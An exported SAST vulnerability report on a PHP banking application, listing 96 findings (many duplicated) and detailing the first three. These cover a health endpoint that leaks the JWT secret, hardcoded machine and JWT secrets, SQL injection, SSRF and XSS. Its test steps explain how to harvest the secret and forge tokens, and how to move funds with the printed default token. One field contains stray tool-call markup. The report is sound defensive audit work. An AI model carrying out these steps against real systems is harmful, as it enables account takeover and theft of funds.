# SAST Report: SAST – BankOfEd-main.zip

- Exported: 27/09/2026, 12:30:38
- Total issues: 96

## Issue Summary

| # | Severity | Candidate | Confidence | Validation | Reportable | Location |
|---:|---|---|---:|---|---|---|
| 1 | HIGH | Unauthenticated /api/health endpoint discloses JWT signing secret and DB credentials | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:22-33 |
| 2 | HIGH | Hardcoded default machine_token allows forging machine-to-machine payment authorization | 90% | confirmed | Yes | BankOfEd-main/config/app.php:35 |
| 3 | HIGH | Hardcoded default JWT and SSO signing secrets enable token forgery if env vars unset | 82% | confirmed | Yes | BankOfEd-main/config/app.php:23,33; BankOfEd-main/config/admin.php:21 |
| 4 | MEDIUM | CORS misconfiguration: reflected Origin with credentials allowed; cors_origin config is dead code | 82% | dismissed | No | BankOfEd-main/config/app.php:32 and BankOfEd-main/src/Middleware/CorsMiddleware.php:9-10 |
| 5 | HIGH | Unauthenticated /api/health endpoint discloses JWT signing secret and DB credentials | 95% | confirmed | Yes | BankOfEd-main/src/Router.php:20-33 (route registered at line 87) |
| 6 | HIGH | Hardcoded default machine-to-machine token allows unauthorized fund transfer | 93% | confirmed | Yes | BankOfEd-main/config/app.php:35 and BankOfEd-main/src/Models/MachineToken.php:23-31 |
| 7 | HIGH | Hardcoded default JWT secrets for admin and user auth enable token forgery | 80% | confirmed | Yes | BankOfEd-main/config/admin.php:21, BankOfEd-main/config/app.php:23 |
| 8 | MEDIUM | Hardcoded default insurance SSO shared secret enables cross-app token forgery | 68% | confirmed | Yes | BankOfEd-main/config/app.php:33 |
| 9 | HIGH | CORS middleware reflects arbitrary Origin with credentials enabled, ignoring configured cors_origin | 70% | confirmed | Yes | BankOfEd-main/src/Middleware/CorsMiddleware.php:8-11 |
| 10 | HIGH | SQL Injection via unsanitized 'search' GET parameter in Admin customer listing | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:20-32 |
| 11 | HIGH | SQL Injection via unsanitized 'sort' GET parameter in transaction history listing | 93% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:44 |
| 12 | HIGH | JWT signature never verified in AuthService::decodeToken — full authentication bypass on banking API | 98% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:50 |
| 13 | HIGH | Unauthenticated /api/health endpoint discloses live JWT signing secret | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:23 |
| 14 | HIGH | Stored XSS via escaping-order bug in onclick attribute construction (FX rates / address book pages) | 88% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/fx-rates.js:47 (renderTable), BankOfEd-main/public/banking/js/pages/addressbook.js:63 (renderList) |
| 15 | HIGH | Unauthenticated /api/health endpoint discloses JWT signing secret and database credentials | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:22-35 |
| 16 | HIGH | Unauthenticated bulk data export endpoint exposes full users/accounts/transactions tables | 97% | confirmed | Yes | BankOfEd-main/src/AdminRouter.php:38, BankOfEd-main/src/Controllers/AdminUserController.php:170-183 |
| 17 | HIGH | Unauthenticated bulk export of all users/accounts/transactions | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:180 |
| 18 | HIGH | Broken object-level authorization in PUT /api/profile via attacker-controlled user_id | 96% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:47 |
| 19 | MEDIUM | IDOR: any authenticated user can view any other user's transaction by ID | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/TransactionController.php:38 |
| 20 | MEDIUM | Permissive CORS: arbitrary Origin reflected with Allow-Credentials true, cors_origin config unused | 75% | confirmed | Yes | BankOfEd-main/src/Middleware/CorsMiddleware.php:10 |
| 21 | HIGH | Hardcoded default machine token grants payments-API access if unrotated | 90% | confirmed | Yes | BankOfEd-main/src/Models/MachineToken.php:24 |
| 22 | MEDIUM | Hardcoded default SSO shared secret enables cross-app identity forgery if unrotated | 72% | confirmed | Yes | BankOfEd-main/src/Services/InsuranceService.php:39 |
| 23 | MEDIUM | Hardcoded default admin JWT secret with no enforced override | 68% | confirmed | Yes | BankOfEd-main/config/admin.php:21 |
| 24 | HIGH | SQL injection via 'search' parameter in admin customer listing | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:24 |
| 25 | HIGH | JWT signature not verified in AuthService::decodeToken — full authentication/authorization bypass | 98% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:50-66 |
| 26 | HIGH | ProfileController::update lets any authenticated user modify another user's profile via 'user_id' body param | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:48-58 |
| 27 | HIGH | SSRF in ProfileController::avatarProxy via user-supplied URL | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:65-99 |
| 28 | HIGH | Unauthenticated /api/health leaks JWT signing secret and DB credentials | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:22-33 |
| 29 | MEDIUM | User::toPublic exposes password_hash and totp_secret to the authenticated client | 93% | confirmed | Yes | BankOfEd-main/src/Models/User.php:66-82 |
| 30 | HIGH | Unauthenticated /api/health leaks JWT secret and DB credentials | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:22-34 |
| 31 | HIGH | BOLA: GET /api/transactions/{id} returns any user's transaction without ownership check | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/TransactionController.php:37-44 |
| 32 | HIGH | IDOR in transferExternal: no ownership check on source account allows draining other users' accounts | 98% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:154-160 |
| 33 | HIGH | Stored DOM XSS: transaction description rendered unescaped in account detail view | 92% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/accounts.js:140 |
| 34 | HIGH | Stored XSS in admin panel via customer name rendered inside inline event-handler attributes (HTML-entity encoding decoded before JS execution) | 82% | confirmed | Yes | BankOfEd-main/public/admin/js/utils.js:20 (escapeHtml) used by BankOfEd-main/public/admin/js/pages/customers.js:~145 (renderDetail confirmDelete onclick), fx-rates.js:~88, accounts.js:~87 |
| 35 | HIGH | IDOR: transferExternal allows draining funds from any account (no ownership check) | 97% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:transferExternal |
| 36 | HIGH | SSRF/LFI in avatarProxy via unrestricted file_get_contents($data['url']) | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:avatarProxy |
| 37 | MEDIUM | Reflected XSS via avatar source_url rendered with jQuery .html() | 72% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/profile.js:136 |
| 38 | HIGH | Stored/Reflected XSS via unescaped transaction description on dashboard | 93% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/dashboard.js:67 |
| 39 | HIGH | BOLA: ProfileController::update allows overwriting any user's profile via 'user_id' body parameter | 96% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:update |
| 40 | MEDIUM | Sensitive fields (password_hash, totp_secret) leaked in profile/auth API responses | 95% | confirmed | Yes | BankOfEd-main/src/Models/User.php:toPublic |
| 41 | MEDIUM | No rate limiting / lockout on TOTP verification allows brute-forcing 6-digit codes | 70% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:totpVerify |
| 42 | HIGH | SQL Injection in admin customer search (AdminUserController::index) | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:index |
| 43 | HIGH | Unauthenticated full customer/account/transaction data export endpoint | 97% | confirmed | Yes | BankOfEd-main/src/AdminRouter.php:44 |
| 44 | HIGH | Unauthenticated /api/health endpoint leaks JWT signing secret and DB credentials | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:22 |
| 45 | MEDIUM | IDOR: any authenticated user can view any other user's transaction by id | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/TransactionController.php:show |
| 46 | HIGH | Stored DOM XSS via account_name breaking out of onclick attribute in admin Accounts page | 90% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/accounts.js:50 |
| 47 | HIGH | Stored DOM XSS via first_name/last_name breaking out of onclick attribute in admin Customer detail page | 93% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/customers.js:161 |
| 48 | HIGH | SSRF via unrestricted avatar URL fetch (file_get_contents) triggered from client importAvatar | 93% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:80 |
| 49 | MEDIUM | Stored self-XSS via unescaped Content-Type header reflected into avatar data-URI rendered with innerHTML | 82% | confirmed | Yes | BankOfEd-main/public/banking/js/app.js:72 |
| 50 | HIGH | JWT signature verification bypass in customer AuthMiddleware (token forgery / auth bypass) | 97% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:47 (decodeToken), used by BankOfEd-main/src/Middleware/AuthMiddleware.php:20 |
| 51 | HIGH | JWT signing secret and DB credentials disclosed via public /api/health endpoint | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:24-33 (health), route registered with auth=false |
| 52 | HIGH | Stored XSS via transaction description rendered without escaping in account transaction history | 93% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/accounts.js:164 |
| 53 | HIGH | Stored XSS via unescaped transaction description in account transaction list | 93% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/accounts.js:151-171 |
| 54 | HIGH | Stored XSS via transaction description rendered without HTML-escaping | 88% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/dashboard.js:91 |
| 55 | HIGH | SSRF / local file read via unvalidated avatar import URL | 93% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:74 |
| 56 | MEDIUM | DOM XSS via unescaped avatar source_url / Content-Type header in renderAvatar | 75% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/profile.js:136 |
| 57 | HIGH | Unauthenticated /api/health endpoint leaks JWT signing secret and DB credentials | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:22-32 (route registered at line 86, auth=false) |
| 58 | HIGH | Broken Object Level Authorization in profile update via attacker-supplied user_id | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:52 (update) |
| 59 | HIGH | SSRF via unrestricted server-side fetch of user-supplied URL in avatar proxy | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:66-100 (avatarProxy) |
| 60 | HIGH | SQL Injection in admin customer search (AdminUserController::index) | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:22-33 |
| 61 | MEDIUM | Hardcoded fallback JWT secret for admin panel authentication | 78% | confirmed | Yes | BankOfEd-main/config/admin.php:20 and BankOfEd-main/src/Controllers/AdminAuthController.php:38-44 |
| 62 | HIGH | Unauthenticated full database export endpoint discloses all users, accounts, and transactions | 98% | confirmed | Yes | BankOfEd-main/src/AdminRouter.php:48 and BankOfEd-main/src/Controllers/AdminUserController.php:171-183 |
| 63 | HIGH | SQL injection via unvalidated 'sort' GET parameter in Transaction::findByUser (ORDER BY clause) | 95% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:44 |
| 64 | HIGH | SQL injection via unvalidated 'sort' GET parameter in Transaction::findByUser (no accountId branch) | 93% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:59 |
| 65 | HIGH | SQL injection in admin customer search via unsanitized LIKE interpolation | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:22 |
| 66 | HIGH | SQL injection via unsanitized `sort` parameter in transaction listing ORDER BY clause | 95% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:44 |
| 67 | HIGH | Unauthenticated admin data export exposes all users, accounts, and transactions | 97% | confirmed | Yes | BankOfEd-main/src/Controllers/AdminUserController.php:174 |
| 68 | HIGH | SSRF via unrestricted user-supplied URL in avatar proxy | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:71 |
| 69 | MEDIUM | IDOR: any authenticated user can view any transaction by ID | 94% | confirmed | Yes | BankOfEd-main/src/Controllers/TransactionController.php:39 |
| 70 | HIGH | JWT signature verification bypassed — full authentication bypass | 98% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:44 |
| 71 | HIGH | BOLA: profile update accepts attacker-controlled user_id to modify any account | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:47 |
| 72 | HIGH | Sensitive fields (password_hash, totp_secret) exposed in profile API responses | 93% | confirmed | Yes | BankOfEd-main/src/Models/User.php:66 |
| 73 | MEDIUM | Weak password hashing algorithm (MD5) for legacy accounts | 92% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:23 |
| 74 | HIGH | Unauthenticated /api/health leaks JWT signing secret and DB credentials | 85% | confirmed | Yes | BankOfEd-main/src/Router.php:24 |
| 75 | MEDIUM | Internal exception details (stack trace, file path) leaked to API clients | 88% | confirmed | Yes | BankOfEd-main/public/index.php:26 |
| 76 | HIGH | Passwords hashed with unsalted MD5 | 95% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:24,29-32 |
| 77 | HIGH | IDOR: transferExternal() debits any account by ID with no ownership check | 97% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:172-176 |
| 78 | HIGH | TOTP/2FA bypass: external transfers proceed without TOTP when user has not enabled 2FA | 95% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:238-247 |
| 79 | HIGH | JWT signature never verified — auth tokens can be forged | 97% | confirmed | Yes | BankOfEd-main/src/Services/AuthService.php:46-62 |
| 80 | HIGH | Broken access control: any authenticated user can modify another user's profile via user_id parameter | 95% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:49-58 |
| 81 | HIGH | Health endpoint discloses JWT signing secret and DB credentials | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:23-34 |
| 82 | MEDIUM | SSRF in avatar proxy — server fetches arbitrary attacker-supplied URL | 90% | confirmed | Yes | BankOfEd-main/src/Controllers/ProfileController.php:66-100 |
| 83 | HIGH | SQL injection via unsanitized ORDER BY column name in transaction history sort parameter | 95% | confirmed | Yes | BankOfEd-main/src/Models/Transaction.php:38-56 |
| 84 | MEDIUM | CORS misconfiguration: reflected Origin with credentials allowed; cors_origin config is dead code — Unused/dead cors_origin configuration gives false impression of origin restricti | 82% | dismissed | No | BankOfEd-main/config/app.php:32 and BankOfEd-main/src/Middleware/CorsMiddleware.php:9-10 |
| 85 | HIGH | Hardcoded default JWT secrets for admin and user auth enable token forgery — Hardcoded default user JWT secret | 78% | confirmed | Yes | BankOfEd-main/config/admin.php:21, BankOfEd-main/config/app.php:23 |
| 86 | HIGH | Unauthenticated /api/health leaks JWT secret and DB credentials — Endpoint is reachable without authentication | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:22-34 |
| 87 | HIGH | Stored XSS in admin panel via customer name rendered inside inline event-handler attributes (HTML-entity encoding decoded before JS execution) — No server-side restriction / output-context-aware encoding of user-supplied firs | 90% | confirmed | Yes | BankOfEd-main/public/admin/js/utils.js:20 (escapeHtml) used by BankOfEd-main/public/admin/js/pages/customers.js:~145 (renderDetail confirmDelete onclick), fx-rates.js:~88, accounts.js:~87 |
| 88 | HIGH | Stored DOM XSS via account_name breaking out of onclick attribute in admin Accounts page — No server-side sanitization or character restriction on account_name allowing qu | 90% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/accounts.js:50 |
| 89 | HIGH | Stored DOM XSS via first_name/last_name breaking out of onclick attribute in admin Customer detail page — No character/quote restriction on user-supplied first_name/last_name at registra | 90% | confirmed | Yes | BankOfEd-main/public/admin/js/pages/customers.js:161 |
| 90 | MEDIUM | Stored self-XSS via unescaped Content-Type header reflected into avatar data-URI rendered with innerHTML — Client renders untrusted avatar_data via innerHTML instead of setting the img sr | 85% | confirmed | Yes | BankOfEd-main/public/banking/js/app.js:72 |
| 91 | HIGH | Stored XSS via transaction description rendered without escaping in account transaction history — Missing output encoding of tx.description in dashboard.js recent transactions wi | 95% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/accounts.js:164 |
| 92 | HIGH | Stored XSS via transaction description rendered without escaping in account transaction history — Missing server-side sanitization of user-supplied description field before persi | 93% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/accounts.js:164 |
| 93 | HIGH | Stored XSS via unescaped transaction description in account transaction list — Missing input sanitization/HTML-stripping of description field server-side in Tr | 95% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/accounts.js:151-171 |
| 94 | HIGH | Stored XSS via transaction description rendered without HTML-escaping — Missing/insufficient server-side sanitization of user-supplied transfer descript | 55% | confirmed | Yes | BankOfEd-main/public/banking/js/pages/dashboard.js:91 |
| 95 | HIGH | Unauthenticated /api/health endpoint leaks JWT signing secret and DB credentials — Endpoint is not gated behind authentication despite exposing sensitive configura | 97% | confirmed | Yes | BankOfEd-main/src/Router.php:22-32 (route registered at line 86, auth=false) |
| 96 | HIGH | TOTP/2FA bypass: external transfers proceed without TOTP when user has not enabled 2FA — Fail-open TOTP enforcement when totp_code is omitted even though 2FA is enabled | 95% | confirmed | Yes | BankOfEd-main/src/Services/TransferService.php:238-247 |

## 1. Unauthenticated /api/health endpoint discloses JWT signing secret and DB credentials

- Lead reference: PWNJ-001
- Category: A02
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:22-33
- Fingerprint: 43faed142a6f33ff4d8b47b7d486e990ead7c796b9540e80ca4811f62bb0593e

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:22-33
```

#### Controls encountered

```
[
  "None found - route is explicitly registered with 'auth' => false and Router::dispatch() only calls AuthMiddleware when auth === true, so no authentication, authorization, or environment (e.g., APP_ENV=production) gating is applied to the /api/health handler."
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "AuthService::decodeToken() does not actually verify the JWT signature against jwt_secret (it just base64-decodes the payload and checks expiry), meaning JWT forgery is possible even without knowing the secret; this slightly changes the exploit narrative around 'forging JWTs with the leaked secret' but does not negate the underlying disclosure vulnerability of jwt_secret and DB credentials via the unauthenticated endpoint."
]
```

#### Proof gaps

```
[
  "Did not verify whether a production deployment might front this endpoint with a WAF/reverse-proxy rule blocking /api/health from external access, though nothing in the application code itself provides such a control.",
  "Did not confirm live runtime environment variable values (JWT_SECRET, DB_HOST, etc.) but the code path unconditionally returns whatever value config/app.php resolves to, which is sufficient to establish the vulnerability."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated network client",
    "GET /api/health (Router.php route registered 'auth'=>false)",
    "Router::health() handler",
    "require config/app.php",
    "JSON response body includes jwt_secret, db_host, db_name, db_user",
    "Attacker signs arbitrary JWT {sub:<any user id>, exp:future} with leaked jwt_secret",
    "AuthMiddleware/AuthService accept forged token on any '/api/*' protected route",
    "Full account takeover of any customer (accounts, transfers, address book, profile)"
  ],
  "impact": "Unauthenticated disclosure of the exact HS256 JWT signing secret plus DB host/user enables forging valid session tokens for any user id, giving complete authentication bypass and account takeover across the banking API, plus DB reconnaissance for further attacks.",
  "severity_reasoning": "High: zero-privilege network-reachable endpoint discloses the single secret protecting every authenticated endpoint in a financial application; exploitation requires no credentials and yields full account takeover.",
  "dynamic_test": "curl -s https://target/api/health and confirm the JSON contains jwt_secret/db_host/db_user with no Authorization header; then use the leaked secret to sign a JWT (header.payload.HMACSHA256) with sub=1,exp=future via pyjwt/jwt.io and send it as Bearer token to GET /api/profile or /api/accounts to confirm access to another user's data."
}
```

#### Validator reasoning

The vulnerability is fully verified by direct code inspection. In Router.php, the route table registers `/api/health` with `'auth' => false`, and in `dispatch()` the auth-gating logic only invokes AuthMiddleware::handle() when `$requiresAuth === true` (or MachineAuthMiddleware when `'machine'`); for `false` no auth check is performed at all, so `Router::health()` is reachable by any unauthenticated client. `health()` loads `config/app.php` and places `db_host`, `db_name`, `db_user`, and the raw `jwt_secret` value directly into the JSON success response via `Response::success()`, with no redaction, environment gating, or authorization check. `config/app.php`'s `jwt_secret` key (sourced from `getenv('JWT_SECRET')` with an insecure hardcoded fallback) is confirmed to be the exact same secret used elsewhere: `AuthService::createToken()` uses `$config['jwt_secret']` to sign user JWTs. Therefore this endpoint discloses the live signing secret plus DB connection details to any unauthenticated caller — a clear, unauthenticated sensitive-data-exposure vulnerability (CWE-200 / A02). Note: inspection of `AuthService::decodeToken()` shows the app additionally fails to verify JWT signatures at all when validating tokens (a separate, even more severe authentication bypass flaw not part of this candidate), which means forging tokens doesn't strictly require the leaked secret — but that fact does not diminish the validity of this specific finding: the health endpoint independently and verifiably discloses the JWT secret and DB credentials to unauthenticated users, which is itself a high-severity, directly exploitable information-disclosure vulnerability regardless of the separate signature-verification defect.

#### Code evidence

```
public static function health(): void
{
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
...
$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 2. Hardcoded default machine_token allows forging machine-to-machine payment authorization

- Lead reference: PWNJ-002
- Category: A02
- Severity: HIGH
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/app.php:35
- Fingerprint: 888a3f9b64fa87c947c2b44b48f9b9b5ce14f58382c5466a0904094f1317b6ed

### Evidence Chain

#### Source

```
BankOfEd-main/config/app.php:35
```

#### Controls encountered

```
[
  "PaymentController::transfer restricts the machine-authenticated caller to only the FACE Insurance merchant account (id 100) or user_id 16's accounts, limiting blast radius to that specific linked account rather than arbitrary accounts",
  "Standard input validation (BSB format, amount>0, source account active, balance sufficiency) is still enforced after machine auth, but these do not mitigate the authentication bypass itself"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "A real production operator who sets the MACHINE_TOKEN env var to a strong secret and does not run install/seed.sql (or purges/rotates the seeded machine_tokens row) would close this exposure; the vulnerability's practical impact is contingent on default/demo deployment configuration",
  "The forged/synthetic 'configured_machine_token' identity is not granted unrestricted access -- it is scoped by PaymentController's machineName check to a single merchant/user's accounts, so it is not a full authentication bypass for arbitrary victim accounts"
]
```

#### Proof gaps

```
[
  "No direct evidence was reviewed confirming how MACHINE_TOKEN is actually set in the target's real production deployment (outside of the repo's own docker-entrypoint.sh/.env.example, which do favor the vulnerable default)",
  "The demo/docker-entrypoint.sh path is explicitly commented as being for a 'demo image' (crash-only DB), so it is unclear whether the same seed/env behavior applies to the production deployment target being assessed"
]
```

#### Attack path

```
{
  "nodes": [
    "External network caller (no credentials)",
    "POST /api/payments/transfer or /api/payments/process (MachineAuthMiddleware, 'auth'=>'machine')",
    "MachineAuthMiddleware reads Authorization: Bearer <token>",
    "MachineToken::validateToken() DB lookup miss",
    "Fallback comparison against config['machine_token'] default 'mch_face_insurance_secret_key_2026' (config/app.php:35, unset MACHINE_TOKEN env)",
    "Authenticated as machine identity 'configured_machine_token'",
    "PaymentController::transfer treats caller as authorized machine (equivalent to face_insurance/user #16)",
    "Unauthorized funds transfer/payment processing"
  ],
  "impact": "Any external caller who knows/reads the hardcoded default machine token can authenticate as a trusted machine-to-machine client and initiate fund transfers/process payments against the FACE Insurance-linked account without any legitimate credential, in a deployment that never rotates MACHINE_TOKEN.",
  "severity_reasoning": "High: a publicly committed literal secret directly authorizes financial transaction endpoints (CWE-798), enabling unauthorized money movement with no legitimate credential.",
  "dynamic_test": "Send POST /api/payments/transfer with header 'Authorization: Bearer mch_face_insurance_secret_key_2026' and a valid transfer payload against a test deployment lacking MACHINE_TOKEN env override; confirm the request is accepted and a transaction is created/funds move."
}
```

#### Validator reasoning

Verified the full source-to-sink path. config/app.php:35 defines 'machine_token' => getenv('MACHINE_TOKEN') ?: 'mch_face_insurance_secret_key_2026' — a hardcoded literal committed to the public repo. MachineToken::validateToken() (src/Models/MachineToken.php) first checks the bearer token against the DB machine_tokens table by SHA-256 hash, and if that lookup fails, unconditionally falls back to a raw string comparison against this same config value (or the same hardcoded literal if config lookup somehow fails). A match returns a synthetic machine identity {'name' => 'configured_machine_token', 'is_active' => 1}. MachineAuthMiddleware::handle() (src/Middleware/MachineAuthMiddleware.php) is invoked by the router for routes with auth === 'machine' and simply extracts the Bearer token and calls MachineToken::validateToken(); any non-null return is accepted as authenticated. Router.php wires this middleware to endpoints including POST /api/payments/process and POST /api/payments/transfer. In PaymentController::transfer(), the resulting machine name is checked: 'face_insurance' or 'configured_machine_token' are both treated as authorized for the FACE Insurance merchant settlement account (account_id 100) or user_id 16, restricting (but not eliminating) the blast radius — an attacker presenting the hardcoded/default token can move funds out of that specific real, seeded account. I additionally confirmed that .env.example does not set MACHINE_TOKEN, and docker-entrypoint.sh performs a fresh install that loads install/seed.sql, which inserts a machine_tokens row (id 1, name 'face_insurance', is_active 1) whose token_hash is literally SHA2('mch_face_insurance_secret_key_2026', 256) — i.e., the very same hardcoded secret is also the seeded, "real" DB-backed machine credential in a default/demo deployment. This means a default/out-of-the-box deployment is authenticatable via the DB path alone using the publicly known literal, and even in deployments where the token row is absent/deactivated, the unconditional fallback in MachineToken.php reproduces the same exposure using the config default. This is a textbook CWE-798 hardcoded/default credential with direct financial-transaction impact, and the described code path is accurate and reachable exactly as claimed.

#### Code evidence

```
// config/app.php
'machine_token' => getenv('MACHINE_TOKEN') ?: 'mch_face_insurance_secret_key_2026',

// src/Models/MachineToken.php
$config = require __DIR__ . '/../../config/app.php';
$fallbackToken = $config['machine_token'] ?? 'mch_face_insurance_secret_key_2026';
if ($rawToken === $fallbackToken) {
    return ['id' => 0, 'name' => 'configured_machine_token', 'is_active' => 1];
}

// src/Controllers/PaymentController.php
if ($machineName === 'face_insurance' || $machineName === 'configured_machine_token') {
    // Authorized for FACE Insurance accounts (merchant or user #16)
    ...
}
```

## 3. Hardcoded default JWT and SSO signing secrets enable token forgery if env vars unset

- Lead reference: PWNJ-003
- Category: A02
- Severity: HIGH
- Confidence: 82%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/config/app.php:23,33; BankOfEd-main/config/admin.php:21
- Fingerprint: 6883f77e0b84f1dcfa2269477d214a3e7215a669009cd265ed1d3f357d464a5c

### Evidence Chain

#### Source

```
BankOfEd-main/config/app.php:23,33; BankOfEd-main/config/admin.php:21
```

#### Controls encountered

```
[
  "[\"deploy.sh (bash/Apache path) randomizes JWT_SECRET and ADMIN_JWT_SECRET via openssl rand and persists them to .env on fresh install, closing the admin/customer JWT secret gap for that specific deployment path only.\", \"AdminAuthMiddleware validates the 'iss' claim equals 'BankOfEdAdmin' and checks token revocation/DB lookup of admin id, but these do not block a properly-crafted forged token signed with the known default secret.\", \"AuthMiddleware for customer tokens does not verify JWT signatures at all (decodeToken only checks exp), which is an even stronger authentication bypass than the hardcoded-secret concern and reduces the relevance of the hardcoded jwt_secret specifically for customer-token forgery.\"]\n<parameter name=\"counterevidence\">[\"deploy.sh generates and persists randomized JWT_SECRET/ADMIN_JWT_SECRET on fresh installs, mitigating those two specific hardcoded defaults when that documented deployment script is used.\", \"AuthMiddleware (customer path) never verifies token signatures, meaning the hardcoded jwt_secret default is not actually the enabling factor for customer account takeover — signature bypass works regardless of the secret's value.\"]\n<parameter name=\"proof_gaps\">[\"No direct evidence of the actual production environment(s) this application is deployed to beyond the two shipped deployment scripts (deploy.sh and Docker); if some undocumented third deployment mechanism always injects strong random secrets via a secrets manager, exploitability there would be eliminated, but no such mechanism is present in this repository.\", \"insurance_sso_secret is never randomized by any shipped script, so it is live with the hardcoded default in both deploy.sh and Docker paths; exploitability against the actual FACE-Insurance receiving application (verification logic) could not be inspected since that codebase is out of scope.\"]\n"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Attacker with source-code knowledge (public repo)",
    "config/app.php / config/admin.php fallback secrets when env vars unset",
    "JWT_SECRET fallback 'bankofed-dev-secret-change-in-production' / ADMIN_JWT_SECRET fallback / INSURANCE_SSO_SECRET fallback",
    "Attacker crafts HS256 JWT signed with known default secret",
    "AuthMiddleware (customer) or AdminAuthMiddleware (admin, uses JWT::decode+Key) or InsuranceService SSO verification accepts token",
    "Impersonation as arbitrary customer, admin, or SSO identity to partner insurance app"
  ],
  "impact": "If an operator forgets to set JWT_SECRET/ADMIN_JWT_SECRET/INSURANCE_SSO_SECRET, an attacker who has read the public source can forge valid customer JWTs, admin JWTs, or SSO assertions, yielding account takeover, admin panel takeover, or impersonation on the partner insurance portal.",
  "severity_reasoning": "High: default/hardcoded cryptographic secrets (CWE-798) in a financial app, exploitable purely from public source disclosure with no additional access, across three trust boundaries (customer, admin, partner SSO).",
  "dynamic_test": "On a deployment without JWT_SECRET/ADMIN_JWT_SECRET/INSURANCE_SSO_SECRET set, sign a JWT with the literal default string and present it as Authorization: Bearer <token> to /api/profile (user) and /api/admin/* (admin, checking iss=BankOfEdAdmin) to confirm acceptance."
}
```

#### Validator reasoning

Verified the hardcoded fallback secrets exist exactly as described: config/app.php:23 ('bankofed-dev-secret-change-in-production' for jwt_secret), config/app.php:33 ('bankofed-goosecable-sso-shared-secret-key-32b' for insurance_sso_secret), and config/admin.php:21 ('bankofed-admin-secret-change-in-production' for jwt_secret). All three are only used when the corresponding env var (JWT_SECRET / INSURANCE_SSO_SECRET / ADMIN_JWT_SECRET) is unset.

